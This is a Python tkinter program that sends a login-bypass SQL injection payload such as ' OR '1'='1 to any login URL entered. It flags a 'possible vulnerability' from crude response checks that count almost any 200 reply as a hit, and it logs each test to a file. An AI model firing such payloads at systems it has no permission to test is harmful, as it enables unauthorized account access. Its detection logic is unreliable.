import tkinter as tk
from tkinter import ttk, messagebox
import requests
from datetime import datetime
import os

class SQLiTester:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Injection Tester")
        self.root.geometry("500x400")
        self.root.configure(bg="#2e3440")
        
        self.create_widgets()
    
    def create_widgets(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TLabel", background="#2e3440", foreground="#d8dee9", font=("Segoe UI", 10))
        style.configure("TButton", font=("Segoe UI", 10))
        style.configure("TEntry", font=("Segoe UI", 10))
        
        ttk.Label(self.root, text="Target Login URL:").pack(pady=(20,5))
        self.url_entry = ttk.Entry(self.root, width=55)
        self.url_entry.pack()
        
        ttk.Label(self.root, text="Username Parameter Name:").pack(pady=(15,5))
        self.user_param_entry = ttk.Entry(self.root, width=35)
        self.user_param_entry.pack()
        
        ttk.Label(self.root, text="Password Parameter Name:").pack(pady=(15,5))
        self.pass_param_entry = ttk.Entry(self.root, width=35)
        self.pass_param_entry.pack()
        
        ttk.Label(self.root, text="Username to test:").pack(pady=(15,5))
        self.username_entry = ttk.Entry(self.root, width=35)
        self.username_entry.pack()
        
        ttk.Label(self.root, text="Password payload (e.g. ' OR '1'='1):").pack(pady=(15,5))
        self.password_entry = ttk.Entry(self.root, width=35)
        self.password_entry.pack()
        
        self.test_btn = ttk.Button(self.root, text="Test SQL Injection", command=self.test_sqli)
        self.test_btn.pack(pady=20)
        
        self.result_text = tk.Text(self.root, height=8, width=60, bg="#3b4252", fg="#d8dee9", font=("Consolas", 10))
        self.result_text.pack(pady=(5,10))
    
    def test_sqli(self):
        url = self.url_entry.get().strip()
        user_param = self.user_param_entry.get().strip()
        pass_param = self.pass_param_entry.get().strip()
        username = self.username_entry.get().strip()
        password = self.password_entry.get().strip()
        
        if not (url and user_param and pass_param and username and password):
            messagebox.showerror("Input Error", "Please fill all fields.")
            return
        
        payload = {
            user_param: username,
            pass_param: password
        }
        
        try:
            response = requests.post(url, data=payload, timeout=10)
            content = response.text.lower()
            
            if ("welcome" in content or "logout" in content or response.status_code == 200) and "error" not in content:
                result = f"[!] Possible SQL Injection vulnerability detected!\nResponse code: {response.status_code}\nResponse length: {len(response.text)}"
            else:
                result = "[-] No SQL Injection vulnerability detected with this payload."
            
            self.result_text.delete(1.0, tk.END)
            self.result_text.insert(tk.END, result)
            
            self.save_to_file(url, payload, response.status_code, result)
        
        except Exception as e:
            messagebox.showerror("Request Error", str(e))
    
    def save_to_file(self, url, payload, status_code, result):
        try:
            os.makedirs("sqli_test_logs", exist_ok=True)
            filename = f"sqli_test_logs/sqli_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=== SQL Injection Test Report ===\n")
                f.write(f"Date/Time: {datetime.now()}\n")
                f.write(f"Target URL: {url}\n")
                f.write(f"Payload sent: {payload}\n")
                f.write(f"Response Status Code: {status_code}\n\n")
                f.write(f"Result:\n{result}\n")
            
            print(f"[+] Test report saved to {filename}")
        except Exception as e:
            print(f"Failed to save test report: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = SQLiTester(root)
    root.mainloop()
